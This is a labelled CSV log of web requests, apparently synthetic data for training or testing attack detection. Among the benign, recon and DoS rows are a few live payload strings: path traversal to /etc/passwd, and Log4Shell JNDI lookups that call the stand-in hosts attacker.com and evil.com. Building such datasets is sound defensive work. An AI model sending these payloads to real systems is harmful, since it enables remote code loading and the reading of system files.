timestamp,attack_type,cve,cvss_score,severity,payload_snippet,label,status_code
2026-05-21T12:46:04.042248,recon,N/A,0,LOW,/.git/config,1,N/A
2026-05-21T12:46:06.316482,recon,N/A,0,LOW,/web.config,1,N/A
2026-05-21T12:46:10.258651,recon,N/A,0,LOW,/.git/config,1,N/A
2026-05-21T12:46:14.153618,recon,N/A,0,LOW,/wp-admin,1,N/A
2026-05-21T12:46:18.418776,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:46:21.470911,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:46:24.192295,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:46:27.809172,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:46:27.871549,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:46:30.036731,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:46:30.098259,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:46:32.218178,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:46:32.307568,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:46:34.491525,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:46:34.628876,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:46:36.661085,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:46:36.852297,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:46:38.878635,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:46:39.001197,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:46:41.077830,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:46:41.139724,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:46:43.339603,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:46:43.430749,dos,N/A,0,HIGH,large_payload,1,201
2026-05-21T12:46:45.664788,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:46:48.252392,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:46:51.020277,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:46:54.094543,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:46:57.029534,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:46:59.882420,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:47:02.273615,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:47:05.208380,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:47:06.673597,path_traversal,CVE-2021-41773,9.8,CRITICAL,....//....//....//etc/passwd,1,N/A
2026-05-21T12:47:08.922376,path_traversal,CVE-2021-41773,9.8,CRITICAL,/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1,N/A
2026-05-21T12:47:11.180143,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:47:13.559010,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:47:16.075865,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:47:18.634135,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:47:21.170703,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:47:23.987886,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:47:27.055893,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:47:32.276818,log4shell,CVE-2021-44228,10.0,CRITICAL,${jndi:dns://attacker.com},1,N/A
2026-05-21T12:47:36.422612,log4shell,CVE-2021-44228,10.0,CRITICAL,${jndi:ldaps://evil.com:1389/Exploit},1,N/A
2026-05-21T12:47:38.985695,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:47:41.437564,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:47:44.118817,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:47:47.153223,benign,N/A,0,NONE,normal_data,0,201
